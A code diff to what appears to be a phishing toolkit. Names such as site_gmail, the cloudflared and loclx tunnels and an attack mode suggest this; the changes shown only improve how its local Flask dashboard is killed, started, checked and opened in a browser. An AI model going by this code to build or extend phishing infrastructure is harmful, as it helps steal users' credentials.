@@ -230,9 +230,9 @@ def kill_pid():
         os.system("taskkill /F /IM php.exe >nul 2>&1")
         os.system("taskkill /F /IM cloudflared.exe >nul 2>&1")
         os.system("taskkill /F /IM loclx.exe >nul 2>&1")
-        # Kill any existing dashboard on port 5000
+        # Kill any existing dashboard on port 5000 (specifically the LISTENING process)
         os.system(
-            "for /f \"tokens=5\" %a in ('netstat -aon ^| findstr :5000') do taskkill /F /PID %a >nul 2>&1"
+            "for /f \"tokens=5\" %a in ('netstat -aon ^| findstr :5000 ^| findstr LISTENING') do taskkill /F /PID %a >nul 2>&1"
         )
     else:
         for p in ["php", "cloudflared", "loclx"]:
@@ -1365,21 +1365,45 @@ def site_gmail():
 
 def show_dashboard_info(from_attack=False):
     global monitoring_thread, stop_monitoring
+    is_running = False
+    try:
+        import socket
+        s = socket.socket()
+        s.settimeout(1)
+        result = s.connect_ex(('localhost', 5000))
+        s.close()
+        is_running = (result == 0)
+    except Exception:
+        pass
+
     os.system("cls" if os.name == "nt" else "clear")
     banner_small()
+    status_label = f"{WHITE}LIVE ✓{RESET}" if is_running else f"{RED}NOT RUNNING ✗{RESET}"
     print(f"""
     {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    {DARK}[{WHITE}+{DARK}]{LIGHT1} Web Dashboard is LIVE and running in the background
+    {DARK}[{WHITE}+{DARK}]{LIGHT1} Web Dashboard Status: {status_label}
     {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
     {DARK}[{WHITE}-{DARK}]{LIGHT2} Local URL   : {WHITE}http://localhost:5000
     {DARK}[{WHITE}-{DARK}]{LIGHT2} Network URL : {WHITE}http://0.0.0.0:5000
 
-    {DARK}[{WHITE}-{DARK}]{MEDIUM} Open the URL above in your browser to access the dashboard.
+    {DARK}[{WHITE}-{DARK}]{MEDIUM} Opening dashboard in your default browser...
     {DARK}[{WHITE}-{DARK}]{MEDIUM} The dashboard runs continuously in the background.
 
     {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     """)
+
+    if is_running:
+        import webbrowser
+        webbrowser.open("http://localhost:5000")
+        slow_type(f"    [+] Dashboard opened in browser!", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+    else:
+        slow_type(f"    [!] Dashboard not running. Restarting...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_RED)
+        start_dashboard()
+        time.sleep(3)
+        import webbrowser
+        webbrowser.open("http://localhost:5000")
+        slow_type(f"    [+] Dashboard restarted and opened!", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
 
     if from_attack:
         print(f"    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Return to Main Menu")
@@ -1567,13 +1591,44 @@ def main_menu():
 
 
 def start_dashboard():
-    # Silent start for Flask
+    """Start Flask dashboard in background and wait to confirm it's running."""
+    import socket
+
+    # Check if already running
+    try:
+        s = socket.socket()
+        s.settimeout(1)
+        result = s.connect_ex(("localhost", 5000))
+        s.close()
+        if result == 0:
+            slow_type(f"    [+] Dashboard already running at http://localhost:5000", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+            return
+    except Exception:
+        pass
+
     app_path = os.path.join(BASE_DIR, "dashboard/app.py")
     subprocess.Popen(
         [sys.executable, app_path],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
+        creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
     )
+
+    # Wait up to 8 seconds for it to be ready
+    for _ in range(16):
+        time.sleep(0.5)
+        try:
+            s = socket.socket()
+            s.settimeout(1)
+            result = s.connect_ex(("localhost", 5000))
+            s.close()
+            if result == 0:
+                slow_type(f"    [+] Dashboard is LIVE at http://localhost:5000", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
+                return
+        except Exception:
+            pass
+
+    print(f"    {DARK}[{PINK}!{DARK}]{PINK} Dashboard may be slow to start. Try http://localhost:5000 manually.")
 
 
 def ai_assistant_menu():
